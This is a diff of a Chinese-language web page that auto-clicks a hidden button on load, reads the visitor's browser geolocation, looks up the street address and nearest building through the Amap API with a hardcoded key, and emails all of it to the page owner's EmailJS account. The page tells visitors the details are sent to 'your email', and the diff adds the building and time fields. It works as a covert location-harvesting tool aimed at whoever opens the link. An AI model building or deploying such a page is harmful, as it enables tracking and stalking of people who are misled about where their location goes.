@@ -2,30 +2,32 @@
 <html lang="zh">
 <head>
   <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1" />
-  <title>位置获取中...</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>正在获取您的位置...</title>
 
   <!-- EmailJS SDK -->
   <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
   <script>
     (function () {
-      emailjs.init("user_你的EmailJS_PublicKey"); // ← 替换为你的 EmailJS 公钥
+      emailjs.init("user_你的EmailJS_PublicKey"); // 替换
     })();
   </script>
 
   <style>
     body {
-      font-family: Arial, sans-serif;
+      font-family: "Helvetica Neue", sans-serif;
+      padding: 2rem;
       text-align: center;
-      padding: 40px;
+      background-color: #f9f9f9;
     }
     h1 {
       color: #333;
+      margin-bottom: 1rem;
     }
     #output {
-      margin-top: 20px;
-      font-size: 16px;
+      font-size: 1rem;
       white-space: pre-wrap;
+      margin-top: 1.5rem;
     }
     #getBtn {
       display: none;
@@ -34,70 +36,68 @@
 </head>
 
 <body onload="document.getElementById('getBtn').click()">
-  <h1>正在获取您的位置信息...</h1>
-  <p>请允许浏览器获取您的地理位置</p>
+  <h1>正在定位，请授权浏览器获取位置</h1>
+  <p>获取成功后将自动发送位置信息</p>
 
-  <!-- 隐藏按钮自动点击 -->
-  <button id="getBtn" onclick="getLocation()">获取并发送位置</button>
+  <!-- 隐藏的按钮 -->
+  <button id="getBtn" onclick="getLocation()">获取位置</button>
 
-  <div id="output">正在定位中，请稍候...</div>
+  <div id="output">正在定位中...</div>
 
   <script>
     async function getLocation() {
       const output = document.getElementById("output");
-      output.innerText = "📍 正在请求地理位置权限...";
+      output.innerText = "📍 正在请求地理位置，请授权浏览器...";
 
       if (!navigator.geolocation) {
-        output.innerText = "❌ 当前浏览器不支持定位功能";
+        output.innerText = "❌ 当前浏览器不支持定位功能。";
         return;
       }
 
       navigator.geolocation.getCurrentPosition(async (position) => {
         const lat = position.coords.latitude.toFixed(6);
         const lon = position.coords.longitude.toFixed(6);
-        output.innerText = `✅ 坐标已获取：\n纬度: ${lat}\n经度: ${lon}`;
+        output.innerText = `✅ 获取坐标成功\n纬度: ${lat}\n经度: ${lon}`;
 
-        // 高德地图 API 获取详细地址
-        const amapKey = "a6afcdeff7089690badc696e6584eade"; // ← 替换为你的高德 Key
-        const apiUrl = `https://restapi.amap.com/v3/geocode/regeo?location=${lon},${lat}&key=${amapKey}&output=json`;
+        const amapKey = "a6afcdeff7089690badc696e6584eade"; // ← 替换
+        const apiUrl = `https://restapi.amap.com/v3/geocode/regeo?location=${lon},${lat}&key=${amapKey}&output=json&extensions=all`;
 
         try {
           const res = await fetch(apiUrl);
           const data = await res.json();
 
           if (data.status === "1") {
-            const address = data.regeocode.formatted_address;
             const city = data.regeocode.addressComponent.city || data.regeocode.addressComponent.province;
+            const address = data.regeocode.formatted_address;
+            const poi = data.regeocode.pois?.[0]?.name || "未知建筑";
             const now = new Date().toLocaleString();
 
-            output.innerText += `\n📌 城市：${city}\n🏢 地址：${address}`;
+            output.innerText += `\n🏙️ 城市：${city}\n🏢 建筑：${poi}\n📍 地址：${address}\n🕒 时间：${now}`;
 
             const templateParams = {
               latitude: lat,
               longitude: lon,
               city: city,
               address: address,
+              poi: poi,
               datetime: now
             };
 
             emailjs.send("service_你的ServiceID", "template_你的TemplateID", templateParams)
               .then(() => {
-                output.innerText += "\n📬 位置信息已发送到您的邮箱 ✅";
-              }, (error) => {
-                output.innerText += "\n❌ 邮件发送失败：" + error.text;
+                output.innerText += "\n📬 已将位置信息发送至您的邮箱 ✅";
+              }, (err) => {
+                output.innerText += "\n❌ 邮件发送失败：" + err.text;
               });
 
           } else {
-            output.innerText += "\n❌ 地址解析失败";
+            output.innerText += "\n❌ 地址解析失败。";
           }
-
         } catch (e) {
-          console.error("调用错误：", e);
-          output.innerText += "\n❌ 请求失败：" + e.message;
+          output.innerText += "\n❌ 请求出错：" + e.message;
         }
-
-      }, (error) => {
-        output.innerText = "❌ 获取定位失败：" + error.message;
+      }, (err) => {
+        output.innerText = "❌ 获取定位失败：" + err.message;
       });
     }
   </script>
